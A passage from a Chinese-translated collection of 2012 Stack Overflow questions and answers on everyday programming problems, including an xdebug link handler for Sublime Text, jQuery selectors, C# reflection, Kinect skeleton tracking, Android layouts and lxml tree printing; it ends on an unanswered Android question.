@="URL:sblm Protocol Handler"
"URL Protocol"=""

[HKEY_CLASSES_ROOT\Sublime Text\DefaultIcon]
@="\"C:\\Program Files\\Sublime Text 2\\sublime_text.exe,1\""

[HKEY_CLASSES_ROOT\sblm\shell]

[HKEY_CLASSES_ROOT\sblm\shell\open]

[HKEY_CLASSES_ROOT\sblm\shell\open\command]
@="\"C:\\Windows\\sublime.bat\" \"C:\\Program Files\\Sublime Text 2\\sublime_text.exe\" \%1\"" 
```

还将 xdebug.file_link_format 更改为 `xdebug.file_link_format="sblm://open/?f=%f:%l"`

现在 ST2 仍然打开一个文件，但它来自浏览器目录，其中几乎包含链接但不包括 C:\w。

例如 xdebug 链接 sblm://open/?f=C:\wamp\www\busadv\parse3.php:10

在 ST2 中打开的文件是 C:\Program Files\SRWare Iron\amp\www\busadv\parse3.php

# javascript - JavaScript 中的 For 循环 - 彩票网站

> ID：13093050
> 
> 赞同：1
> 
> 时间：2012-10-26T19:17:27.667
> 
> 标签：javascript, loops, for-loop, while-loop

我正在尝试将此代码转换为正确的 for 循环语句，以便我可以保存我的重复。我已尽力完成它，但我只是不知道如何正确编写它：

```
function myProg() {
    var luckyNumber = 3;
    var luckyNumber2 = 5;
    var luckyNumber3 = 8;
    var firstInput = document.luckForm.numberBox.value;
    var secondInput = document.luckForm.numberBox2.value;
    var thirdInput = document.luckForm.numberBox3.value;
    var temp = '';

    if (firstInput == luckyNumber && secondInput == luckyNumber2 && thirdInput == luckyNumber3 || firstInput == luckyNumber && secondInput == luckyNumber3 && thirdInput == luckyNumber2 || firstInput == luckyNumber2 && secondInput == luckyNumber3 && thirdInput == luckyNumber || firstInput == luckyNumber2 && secondInput == luckyNumber && thirdInput == luckyNumber3 || firstInput == luckyNumber3 && secondInput == luckyNumber && thirdInput == luckyNumber2 || firstInput == luckyNumber3 && secondInput == luckyNumber2 && thirdInput == luckyNumber)
    {
        alert('Congratulations! You got all 3 numbers correct. You\'ve won £1000!');
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:20:37.530

尝试这样的事情：

```
Array.prototype.getDuplicates = function() {
  var cache = {}, results = [], that = this;
  that.forEach(function(item, index) {
      if(!cache.hasOwnProperty(item) && that.lastIndexOf(item) > index) {
          results.push(item);
      }
      cache[item] = true;
  });
  return results;
}

var answers = [luckyNumber, luckyNumber2, luckyNumber3];
var indexes = [answers.indexOf(firstInput), answers.indexOf(secondInput), answers.indexOf(thirdInput)];
if(indexes.indexOf(-1) === -1 && indexes.getDuplicates().length === 0) {
  // alert("Whatever");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:48:53.447

这是一个不使用数组的示例。添加了输入检查。

```
function myProg() {
    var numbersToMatch = 3;
    var luckyNumbers = {n1: 3, n2: 5, n3: 8};
    var firstInput = parseInt(document.luckForm.numberBox.value);
    var secondInput = parseInt(document.luckForm.numberBox2.value);
    var thirdInput = parseInt(document.luckForm.numberBox3.value);

    if (isNaN(firstInput) || isNaN(secondInput) || isNaN(thirdInput)) {
        alert('All inputs must be numbers!');
        return;
    }

    var inputs = {n1: firstInput, n2: secondInput, n3: thirdInput};
    var matches = {n1: false, n2: false, n3: false};

    for (var i in inputs) {
        for (var j in luckyNumbers) {
            if ((!matches[j]) && (luckyNumbers[j] == inputs[i])) {
                matches[j] = true;
                numbersToMatch--;
                break;
            }
        }
    }

    if (numbersToMatch == 0) {
        alert('Congratulations! You got all 3 numbers correct. You\'ve won £1000!');
    }
} 
```

# refresh - Angularjs 刷新 ng:view

> ID：13093053
> 
> 赞同：3
> 
> 时间：2012-10-26T19:17:40.533
> 
> 标签：refresh, angularjs

在使用 Angularjs v0.9 和 php 实现我的会员系统时

在下面这个函数中，我将调用一个api来编辑成员的数据，成功后，php函数将返回

```
{"success":"true"} 
```

并且控制器将返回一个可以查看数据成员的页面。

```
if(response.success==="true") {
window.location="#/register_members";
$('.alert-error').hide();
$('.alert-success').html("Member is updated.");
$('.alert-success').fadeIn();
} 
```

但是，在#/register_members，数据仍然保持不变。无论如何我可以在angularjs中部分刷新页面吗？我正在使用 ng:view 和 $route。

我试过使用

```
window.location.reload(true); 
```

但整个页面更新时不会呈现成功消息。

有谁有想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T06:35:01.917

[在这里](http://ved-antani.com/2010/12/jquery-refresh-a-div-inside-the-same-page/)找到了一个有趣的答案来使用 Jquery 刷新页面中的 div

我的页面是“#/register_members”，我要更新的 div 是“#registerlist”，它位于名为“#browse-box”的 div 中。

所以现在我的控制器将是

```
window.location="#/register_members";
$("#browse-box").load("/#/register_members #registerlist")
$('.alert-error').hide();
$('.alert-success').html("Member is updated.");
$('.alert-success').fadeIn(); 
```

奇迹般有效。:)

# c# - 使用反射的问题

> ID：13093059
> 
> 赞同：-1
> 
> 时间：2012-10-26T19:18:05.360
> 
> 标签：c#, reflection

所以，我想要做的是遍历一个 x 值数组，并且对于每次迭代，获取标签“plabel”+ x 的当前文本值（标签都已经创建和命名。我对使用比较陌生反思，但从我读过的内容来看，以下内容应该有效：

```
PropertyInfo pI;
pI = this.GetType().GetProperty("plabel" + count + ".Text"); //count is the current iteration #
MessageBox.Show(pI.Name); 
```

但这会引发运行时异常。有人可以告诉我这样做的正确方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:24:13.133

尝试这样的事情：

```
//Gets the label (includes private fields)
FieldInfo fi = this.GetType().GetField("plabel" + count, 
                   BindingFlags.NonPublic | BindingFlags.Instance); 

Label label = fi.GetValue(this) as Label;

if (label != null)
{
    MessageBox.Show(label.Text);
} 
```

# mysql - MYSQL - NULL和（null）有什么区别

> ID：13093063
> 
> 赞同：0
> 
> 时间：2012-10-26T19:18:21.963
> 
> 标签：mysql, null

由于最后一个空值的括号，我在谷歌上搜索时遇到了麻烦。

mysql的NULL和（null）有什么区别？我认为当我在创建行时未指定值时，为一行输入了 NULL。但是是什么创建了条目（null）？

我在 mysql 中的一行的条目中看到 (null)。看起来像这样

```
mysql> select * from users;

+--------+-----------+------------+----------+
|id      | field1    | field2     |  field3  |
+--------+-----------+------------+----------+
| 0      | (null)    | (null)     |     NULL | 
```

我正在使用mysql5。(null) 在用户通过输入一些数据编辑行后显示，RubyOnRails 将数据存储在 mysql 中。我试图弄清楚用户可能输入（或不输入）会创建（null）的内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:40:14.953

`NULL`本质上是“无”的意思。如，你没有价值存在。

至于“(null)”，在 MySQL 中是不存在的。如果可能，请详细说明，我将编辑我的答案。

# javascript - 使用 JQuery onblur 设置文本框值

> ID：13093065
> 
> 赞同：3
> 
> 时间：2012-10-26T19:18:22.800
> 
> 标签：javascript, jquery, asp.net, textbox, onblur

我有一个带有以下规则的文本框：1）我在会话中从字典中填充 textbox.text 2）如果用户输入一个新值，setTextBoxData 会将其保存在字典中 3）在输入时（焦点），字段文本是空白。4）在模糊时，如果该字段仍然为空，我想将其设置为原始值。

```
<asp:TextBox ID="txtNumberEmployees" runat="server" Width="50px" onfocus="this.value='';"  
onchange= "javaScript:$(function()setTextBoxData('NUMBEREMPLOYEES','txtNumberEmployees');});"
onblur="javaScript:restore ('txtNumberEmployees', 'NUMBEREMPLOYEES');"/> 
```

上面提到的“恢复”功能是：

```
function restore(control, input) {
    var data = getInputData(input);
    $('#' + control).val(data);
} 
```

getInputData 正确返回数据值。问题出在最后一行。

我尝试了很多方法来设置它，但似乎都没有。这应该是一个简单的问题，但我还不能让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:30:13.373

问题是 ASP.NET 将生成一个不会是`txtNumberEmployees`. ASP.NET 将为您的输入生成一个以 . 结尾的 ID `txtNumEmployees`。

更改此行：

```
$('#' + control).val(data); 
```

对此：

```
$('[id$=' + control + ']').val(data); 
```

它将起作用，因为这是以[Selector 结尾的属性](http://api.jquery.com/attribute-ends-with-selector/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:52:08.593

1：确保您没有 javascript 错误。我看到 onchange 中缺少一个“{”。

2：您可以简单地将“this”作为文本框引用传递并更新如下：

```
<asp:TextBox ID="txtNumberEmployees" runat="server" Width="50px" onfocus="this.value='';"  
onchange= "javaScript:$(function(){setTextBoxData('NUMBEREMPLOYEES',this);});"
onblur="javaScript:restore (this, 'NUMBEREMPLOYEES');"/> 
```

然后只需将值设置为：

```
$(control).val(data); 
```

3：还有其他方法可以获取 asp.net 元素，如下所示。[在 jquery 中查找 ASP.NET ClientID](http://www.west-wind.com/weblog/posts/2009/Oct/15/A-generic-way-to-find-ASPNET-ClientIDs-with-jQuery)

# c# - Kinect 侧身骨架展示

> ID：13093066
> 
> 赞同：1
> 
> 时间：2012-10-26T19:18:29.197
> 
> 标签：c#, kinect

我正在使用带有 Windows Kinect SDK 1.5 的 Kinect 开发游戏。Kinect 摄像头放在桌子上，我侧身站在 Kinect 旁边。我想显示播放器的骨架，如图 1 和图 2。 ![在此处输入图像描述](../Images/bb7ce2a8ebc3a021566e0bddb2728b69.png) 图 1 ![在此处输入图像描述](../Images/3d952d29c3a3d5e3f7831286a5c7daa6.png) 图 2

这些需要 Kinect Skeleton Stream 检测到的关节位置。但在大多数情况下，当玩家侧身站立时，Kinect 无法检测到隐藏在后面的某些关节。如图 1 所示，当我的手臂重叠时，我不希望隐藏手臂的关节显示在屏幕上。我只想显示我左臂的关节。另一种情况是，当我以正常方式放置手臂时，如图 2 所示，我想同时显示它们。

我的想法是使用关节的位置信息和跟踪状态来决定一个手臂是否在你身体的另一部分后面（有很多种重叠，arm-arm，arm-body，arm-head，-arm to leg） . 但我认为仅不显示 Kinect 未跟踪的关节是不够的。也许我们可以通过计算两个手腕、两个肘部和两个肩膀之间的距离来检测两个手臂是否重叠。如果两个手腕和两个肘部的距离都在阈值之内，说明双臂有重叠，我们可以只显示被跟踪的手臂骨骼的关节。

但是还有一个问题，手臂与身体的其他部位重叠的方式有很多，腿也是如此。所以这个解决方案在显示之前需要这么多的阈值和检查。此外，我不确定此解决方案的效果。

你们有更酷的想法来解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T22:01:56.947

查看`SkeletonBasics-WPF`v1.5 SDK Toolkit 示例附带的示例。它将向您显示您想要执行的类似操作。

可能最感兴趣的代码块是这个：

```
foreach (Joint joint in skeleton.Joints)
{
    Brush drawBrush = null;

    if (joint.TrackingState == JointTrackingState.Tracked)
    {
        drawBrush = this.trackedJointBrush;
    }
    else if (joint.TrackingState == JointTrackingState.Inferred)
    {
        drawBrush = this.inferredJointBrush;
    }

    if (drawBrush != null)
    {
        drawingContext.DrawEllipse(drawBrush, null, this.SkeletonPointToScreen(joint.Position), JointThickness, JointThickness);
    }
} 
```

注意`JointTrackingState.Inferred`检查。在这个演示中，关节继续显示，但它们变成黄色。在您的情况下，您可以隐藏它们。 `JointTracingState`也有`NotTracked`枚举，根据您的情况，它也可能有用。

在本例中，骨骼也仅在 为 的关节之间绘制`Tracked`。

顺便说一句 - 在撰写本文时，Windows SDK 的官方 Kinect 是 v1.6。您可能需要考虑更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T00:07:57.470

这是[Kinect 侧向骨骼跟踪](https://stackoverflow.com/questions/10192476/kinect-sideways-skeleton-tracking)的完全相同的副本，因此只需查看[Outlaw Lemur 的回答](https://stackoverflow.com/questions/10192476/kinect-sideways-skeleton-tracking/10260664#10260664)，它解释了 Kinect 的功能以及为什么它不起作用，以及一些关于如何使其工作的变通方法的尝试。从本质上讲，他是说 Kinect 是用来跟踪人们的面部或背部，但会将其解释为他们的正面。侧向跟踪不起作用，因为 Kinect 只能看到你的一半关节，并且必须估计其余的关节，从而导致糟糕的结果。

# xml - 在eclipse中对齐按钮

> ID：13093075
> 
> 赞同：1
> 
> 时间：2012-10-26T19:19:28.947
> 
> 标签：xml, eclipse, android-layout

我正在尝试像简单的计算器一样对齐按钮
但是当我像这样对齐按钮时，当我运行它时，按钮可以从所需的位置移动。
我不明白什么是问题。

![在此处输入图像描述](../Images/116c1248a461ed121b6e3d880e580d16.png) ![在此处输入图像描述](../Images/56e952d2d687ff579e2940dd78564cfb.png)

这是代码：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
tools:ignore="HardcodedText" >

<Button
android:id="@+id/zero"
style="?android:attr/buttonStyleSmall"
android:layout_width="100dp"
android:layout_height="wrap_content"
android:layout_alignParentBottom="true"
android:layout_alignParentLeft="false"
android:layout_marginBottom="124dp"
android:layout_marginLeft="44dp"
android:text="zero" />

<Button
android:id="@+id/dot"
style="?android:attr/buttonStyleSmall"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignBottom="@+id/zero"
android:layout_alignParentLeft="false"
android:layout_alignParentTop="false"
android:layout_toLeftOf="@+id/equ"
android:layout_toRightOf="@+id/zero"
android:text="dot" />

<Button
android:id="@+id/button1"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_above="@+id/zero"
android:layout_alignLeft="@+id/zero"
android:layout_alignParentBottom="false"
android:layout_alignParentLeft="false"
android:layout_alignParentRight="false"
android:layout_alignParentTop="false"
android:layout_alignWithParentIfMissing="false"
android:layout_centerHorizontal="false"
android:layout_centerInParent="false"
android:layout_centerVertical="false"
android:text="one" />

<Button
android:id="@+id/Button01"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignBaseline="@+id/button1"
android:layout_alignBottom="@+id/button1"
android:layout_alignParentBottom="false"
android:layout_alignParentLeft="false"
android:layout_alignParentRight="false"
android:layout_alignParentTop="false"
android:layout_alignWithParentIfMissing="false"
android:layout_centerHorizontal="false"
android:layout_centerInParent="false"
android:layout_centerVertical="false"
android:layout_toRightOf="@+id/button1"
android:text="two" />

<Button
 android:id="@+id/button2"
 style="?android:attr/buttonStyleSmall"
 android:layout_width="50dp"
 android:layout_height="wrap_content"
 android:layout_above="@+id/zero"
 android:layout_alignParentLeft="false"
 android:layout_toRightOf="@+id/zero"
 android:text="three" />
 <Button
 android:id="@+id/equ"
 style="?android:attr/buttonStyleSmall"
 android:layout_width="50dp"
 android:layout_height="100dp"
 android:layout_alignBottom="@+id/dot"
 android:layout_alignParentLeft="false"
 android:layout_below="@+id/Button04"
 android:layout_toRightOf="@+id/button2"
 android:text="equal" />

<Button
android:id="@+id/Button02"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_above="@+id/button1"
android:layout_alignParentLeft="false"
android:layout_toLeftOf="@+id/Button01"
android:text="four" />
<Button
android:id="@+id/Button03"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignParentLeft="false"
android:layout_centerVertical="true"
android:layout_toRightOf="@+id/Button02"
android:text="five" />
<Button
android:id="@+id/Button04"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignBaseline="@+id/Button03"
android:layout_alignBottom="@+id/Button03"
android:layout_alignParentLeft="false"
android:layout_toLeftOf="@+id/equ"
android:text="six" />

<Button
android:id="@+id/Button05"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_above="@+id/Button02"
android:layout_alignParentLeft="false"
android:layout_toLeftOf="@+id/Button03"
android:text="seven" />
<Button
android:id="@+id/Button06"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_above="@+id/Button03"
android:layout_alignParentLeft="false"
android:layout_toLeftOf="@+id/Button04"
android:text="eight" />
<Button
android:id="@+id/Button07"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignBaseline="@+id/Button06"
android:layout_alignBottom="@+id/Button06"
android:layout_alignParentLeft="false"
android:layout_toLeftOf="@+id/equ"
android:text="nine" />
<Button
android:id="@+id/pls"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="100dp"
android:layout_alignBottom="@+id/Button04"
android:layout_alignLeft="@+id/equ"
android:layout_alignParentLeft="false"
android:layout_alignTop="@+id/Button05"
android:text="pls" />
<Button
android:id="@+id/sub"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="40dp"
android:layout_above="@+id/Button07"
android:layout_toRightOf="@+id/Button07"
android:text="sub" />

<Button
android:id="@+id/mul"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignTop="@+id/sub"
android:layout_toLeftOf="@+id/sub"
android:text="mul" />

<Button
android:id="@+id/neg"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignBaseline="@+id/mul"
android:layout_alignBottom="@+id/mul"
android:layout_toLeftOf="@+id/mul"
android:text="neg" />

<Button
android:id="@+id/Button11"
style="?android:attr/buttonStyleSmall"
android:layout_width="50dp"
android:layout_height="wrap_content"
android:layout_alignBaseline="@+id/neg"
android:layout_alignBottom="@+id/neg"
android:layout_alignLeft="@+id/Button05"
android:text="div" />

<TextView
android:id="@+id/textView1"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_above="@+id/neg"
android:layout_alignLeft="@+id/Button11"
android:text="@string/mkcalcolate"
tools:context=".Mksoft" />

</RelativeLayout> 
```

它只是一个简单的对齐，但它不起作用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T19:28:40.620

我首先放置所有按钮，然后设置所有 id 和其他我错的东西。当您使用许多按钮时，您必须一一设置id并对齐它。

# asp.net - System.Net.Cookie 和 System.Web.HttpCookie 有什么区别？

> ID：13093076
> 
> 赞同：9
> 
> 时间：2012-10-26T19:19:40.613
> 
> 标签：asp.net, cookies, client-server, webclient

我获得了一个 HTTPCookie，但需要一个 Net.Cookie。它们只是你可以重铸的东西，还是我会怎么做？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-28T19:51:57.727

其实你有两个问题：

1.  System.Web.HttpCookie 和 System.Net.Cookie 之间的区别
2.  如何从 HTTPCookie 转换为 Cookie。

**第 1 部分）**
这个问题真的很有趣，我还在想为什么有两个看起来很相似的类，我最初的想法是`System.Web.HttpCookie inherits System.Net.Cookie`，但这不是真的，它们*都直接继承自 Object*，所以它们是不同的类，但属性匹配很多，所以这给*第2部分*的解决方案带来了希望。

**第 2 部分）**
我认为理论上可以将一个转换为另一个，因为如果你以正确的方式填充它们，它们都只是对象，这里是我比较两个类时的一点分析。

*点击在新标签中打开放大*
![点击在新标签中打开放大](../Images/de2eb139388347f7b5c73142f0920ae6.png)

**更新：** System.Web 可用于基于服务器的应用程序，而 System.Net 可用于基于客户端的应用程序。

**一些想法：**

1.  编写一个可以将一个对象转换为另一个对象的方法或静态类，我没有检查所有这些，但名称匹配的属性，签名也匹配。
2.  另一个对象中不存在的属性，您可以填充一些常量或您知道与数字相匹配的`Port`值。

祝你好运，让我知道你是如何想出最终解决方案的，发布代码或链接。

**一些链接** [这篇文章有一些相关的代码](https://stackoverflow.com/questions/1779410/c-sharp-sharp-the-difference-between-httpcookie-and-cookie)

# optimization - 我们的 Trigger.IO 应用程序是 9MB，这是否太大？我们如何减少应用程序加载时间？

> ID：13093077
> 
> 赞同：2
> 
> 时间：2012-10-26T19:19:40.437
> 
> 标签：optimization, trigger.io

我们的应用程序目前在首次启动时非常慢。影响应用程序加载时间的关键因素是什么？我们如何加快这一过程？

我们在启动时将非常简单的笔记对象加载到内存中，并打算很快将插件用于本机数据库。

我们计划缩小并使用原生插件进行存储，我们可以采用哪些其他策略？

hojoki 的[这篇客座帖子也很有帮助。](http://trigger.io/cross-platform-application-development-blog/2012/10/25/guest-post-%E2%80%93-inside-hojoki%E2%80%99s-mobile-build-process/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-11T15:15:01.957

**重复资源**

在 trigger.io 中，所有资源（Android + iOS）都打包在一起。例如，启动屏幕 Android 包含在 iOS 和 Android 构建中——反之亦然。也许这就是尺寸的原因之一？

如果是这样，构建两个独立的应用程序，每个平台一个，可能是解决该问题的一种方法。显然，排除非平台资源的能力会更好，但现在还不行。

**文件大小**

在所有 js/css 上运行缩小，减少 png/jpeg 文件大小。

# c# - 在曲线的特定点上得到切线？

> ID：13093078
> 
> 赞同：1
> 
> 时间：2012-10-26T19:19:48.683
> 
> 标签：c#, silverlight, image-processing, graphics

我的想法或项目：

我想开发一个应用程序，它将图像作为输入并返回另一个图像作为输出。例如：我有一个位图图像，里面画了一个圆圈。我想要开发的是一种算法，它将在其中绘制另一个圆圈。我知道这很容易，但它应该适用于任何类型的起始图像，如三角形或任何其他形状。

据我说，我必须穿过形状的内周边并画一条线。但是，我遇到了动态形状的问题。正如我们所知道的算法，对于圆形、椭圆和矩形来说，这个问题很容易，但对于任何其他形状来说，这个问题就变得困难了。

关于如何实现这一目标的任何想法？如果我可以在曲线的特定点上得到切线，那么我也可以做我需要的。

# jquery - Jquery 包装格式不佳的 HTML

> ID：13093082
> 
> 赞同：4
> 
> 时间：2012-10-26T19:20:01.810
> 
> 标签：jquery, html

我有一些格式极差的 HTML 代码，其中表中的每个元素都是一行。我想通过向页面添加一些 HTML 来更轻松地对子元素进行分组。这是 HTML 的一个小例子：

```
<html>
  <head>
    <title>Test</title>
  </head>
  <body>
    <table width="100%">
      <tr class="heading">
        <td>value 1</td>
      </tr>
      <tr>
        <td>sub 1</td>
      </tr>
      <tr>
        <td>sub 1</td>
      </tr>
      <tr class="heading">
        <td>value 2</td>
      </tr>
      <tr>
        <td>sub 2</td>
      </tr>
      <tr class="heading">
        <td>value 3</td>
      </tr>
      <tr>
        <td>sub 3</td>
      </tr>
    </table>
  </body>
</html>​ 
```

我想用一个标题类、另一个 tr 或 div 或任何东西来包装每一行，以便我更容易地抓住子元素。我已经尝试过之前、html 等的各种组合。但我似乎无法让它工作。

这是我放在一起的一个[jsfiddle 。](http://jsfiddle.net/XPNFf/)有什么方法可以用一类标题包装 tr 值？例如，我想在示例 HTML 中获取带有类标题的 3 行。我想在第一行前面加上一些 HTML，然后在第二行开始之前关闭它。我会为每一行重复这个过程（打开一个标签并在下一行之前关闭它），在最后一行我会简单地关闭它。

所以我想要的输出是：

```
<html>
  <head>
    <title>Test</title>
  </head>
  <body>
    <table width="100%">
      <SOME_TAG>
        <tr class="heading">
          <td>value 1</td>
        </tr>
        <tr>
          <td>sub 1</td>
        </tr>
        <tr>
          <td>sub 1</td>
        </tr>
      </SOME_TAG>
      <SOME_TAG>
        <tr class="heading">
          <td>value 2</td>
        </tr>
        <tr>
          <td>sub 2</td>
        </tr>
      </SOME_TAG>
      <SOME_TAG>
        <tr class="heading">
          <td>value 3</td>
        </tr>
        <tr>
          <td>sub 3</td>
        </tr>
      </SOME_TAG>
    </table>
  </body>
</html>​ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T16:27:01.910

根据 kssr 的建议 — 使用 nextUntil 和 wrapAll 将它们包装在子表中

```
$(document).ready(function()
    {
        wrapTR(0);
    });

    function wrapTR(index)
    {
        $('tr.heading:eq('+index+')').nextUntil('.heading').andSelf().wrapAll('<table class="useful-grouping" id="table-'+index+'"/>');
        if($('tr.heading:eq('+index+')').next('.heading'))
        {
            wrapTR(index+1)
        }
    } 
```

# objective-c - 将多个图像从 SQL 设置为表视图单元格

> ID：13093083
> 
> 赞同：1
> 
> 时间：2012-10-26T19:20:03.390
> 
> 标签：objective-c, sql, xcode, sdwebimage

我尝试使用 SDWebImage 将 SQL 中的多个图像设置为表视图单元格。

我现在正在使用此代码，但这会根据 URL 加载一个图像。

```
[cell.imageView setImageWithURL:[NSURL URLWithString:@"http://www.domain.com/path/to/image.jpg"]
                   placeholderImage:[UIImage imageNamed:@"placeholder.png"]]; 
```

您将如何为多个图像填充 imageView？谢谢。

我尝试使用 for 循环。不工作。

```
NSArray *itmImageArray = [self itemImages];

    for(int i = 0; i <= [itmImageArray count]; i++)
    {
        [cell.imageView setImageWithURL:[NSURL URLWithString:@"http://www.domain.com/path/to/%@",[itmImageArray objectAtIndex:i]]
                   placeholderImage:[UIImage imageNamed:@"addnewimage.png"]];
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:46:40.463

一个 UITableViewCell 只有一个 imageView。您使用的技术将不断重置 UITableViewCell 默认具有的相同 imageView，您将看到的是单元格中设置的 for 循环的最后一个图像。如果要显示更多图像，则必须创建一个自定义单元格并添加多个 UIImageViews 作为单元格的子视图。然后，您可以将不同的图像设置到您添加的 UIImageViews 中。请记住，您必须处理 UIImageViews 的框架以及 tableView 行的高度，以便正确显示内容。

# error-handling - Scrape Offer 不返回任何结果

> ID：13093086
> 
> 赞同：5
> 
> 时间：2012-10-26T19:20:24.483
> 
> 标签：error-handling, html-parsing, web-scraping

我在数据库中研究了这个问题，搜索了问题，发现了两个不同的错误。我已经确定 503 错误是亚马逊阻止了我，但我得到了一个不同的错误，它与同一行相同，但没有 503 返回。我无法破译其中的区别。有谁能帮忙吗？下面列出了我遇到的错误。我使用的 html 解析器是 HTML Agility Pack 和 Just Agile

> [http://www.amazon.com/gp/offer-listing/1902915208](http://www.amazon.com/gp/offer-listing/1902915208)错误远程服务器返回错误：（503）服务器不可用。

和

> Scrape Offer 没有返回任何结果。

错误不一致，因此不容易捕获。错误在下一个废料中返回。这是非常随机的，并且不会始终如一地发生在相同的产品上。我每天都会收到很多这样的东西，这使我无法更新价格并向客户提供正确的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T09:21:24.487

所以我发现，问题是发送到亚马逊的用户代理。我在我的 CURL 选项中添加了以下命令，它现在可以工作了——即使没有 US-Proxy。

```
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-12T15:51:07.650

我在每 20 个网页请求之间放置 1 秒睡眠。这解决了我的问题。

# python - lxml（或lxml.html）：打印树结构

> ID：13093091
> 
> 赞同：14
> 
> 时间：2012-10-26T19:20:37.673
> 
> 标签：python, html, xml, lxml

我想以可区分的方式打印出 etree 的树结构（由 html 文档形成）（意味着两个 etree 应该以不同的方式打印出来）。

我所说的结构是树的“形状”，它基本上意味着所有的标签，但没有属性，也没有文本内容。

任何的想法？lxml中有什么东西可以做到这一点吗？

如果不是，我想我必须遍历整个树并从中构造一个字符串。知道如何以紧凑的方式表示树吗？（“紧凑”功能不太相关）

仅供参考，它不是用来查看的，而是用来存储和散列的，以便能够在几个 html 模板之间产生差异。

谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-30T07:35:33.267

也许只是在源 XML 上运行一些 XSLT 以剥离除标签之外的所有内容，然后使用它很容易`etree.tostring`获得可以散列的字符串......

```
from lxml import etree as ET

def pp(e):
    print ET.tostring(e, pretty_print=True)
    print

root = ET.XML("""\
<project id="8dce5d94-4273-47ef-8d1b-0c7882f91caa" kpf_version="4">
<livefolder id="8744bc67-1b9e-443d-ba9f-96e1d0007ba8" idref="707cd68a-33b5-4051-9e40-8ba686c2fdb8">Mooo</livefolder>
<livefolder id="8744bc67-1b9e-443d-ba9f" idref="707cd68a-33b5-4051-9e40-8ba686c2fdb8" />
<preference-set idref="8dce5d94-4273-47ef-8d1b-0c7882f91caa">
  <boolean id="import_live">0</boolean>
</preference-set>
</project>
""")
pp(root)

xslt = ET.XML("""\
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="*">
    <xsl:copy>
      <xsl:apply-templates select="*"/>
    </xsl:copy>
  </xsl:template>
</xsl:stylesheet>
""")
tr = ET.XSLT(xslt)

doc2 = tr(root)
root2 = doc2.getroot()
pp(root2) 
```

给你输出：

```
<project id="8dce5d94-4273-47ef-8d1b-0c7882f91caa" kpf_version="4">
  <livefolder id="8744bc67-1b9e-443d-ba9f-96e1d0007ba8" idref="707cd68a-33b5-4051-9e40-8ba686c2fdb8">Mooo</livefolder>
  <livefolder id="8744bc67-1b9e-443d-ba9f" idref="707cd68a-33b5-4051-9e40-8ba686c2fdb8"/>
  <preference-set idref="8dce5d94-4273-47ef-8d1b-0c7882f91caa">
    <boolean id="import_live">0</boolean>
  </preference-set>
</project>

<project>
  <livefolder/>
  <livefolder/>
  <preference-set>
    <boolean/>
  </preference-set>
</project> 
```

# android - 如何确定哪个区域包含Android中相交区域的最大面积？

> ID：13093095
> 
> 赞同：0
> 
> 时间：2012-10-26T19:20:54.700
> 
> 标签：android, graphics, android-canvas

我想写一个类似于这张照片中的旋转径向菜单

![照片](../Images/c9f2f6de6fc298aac9309163ac2d062a.png)

我设法绘制了视图并使用[Path](http://developer.android.com/reference/android/graphics/Path.html)类绘制了楔子

现在我正在尝试确定选择楔选择了哪个楔（红色的那个）

![楔子](../Images/ff17303f1237b732f951716277ad4b06.png)

我试图在视图中获取所有楔形的区域并尝试检查交叉点和联合，但它不能从下面的照片中工作

![矩形](../Images/de5d308dfd5d87a1e23204389125515b.png)

选择区域同时与 3 个不同的区域相交，如果我尝试联合操作，它将返回 false，因为选择区域不完全位于所选区域内。

所以我想选择包含选择区域最大面积的Wedge，但我不知道如何。

任何帮助，将不胜感激。

如果有人有更好的解决方案或建议，我很乐意听到并应用它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:42:00.657

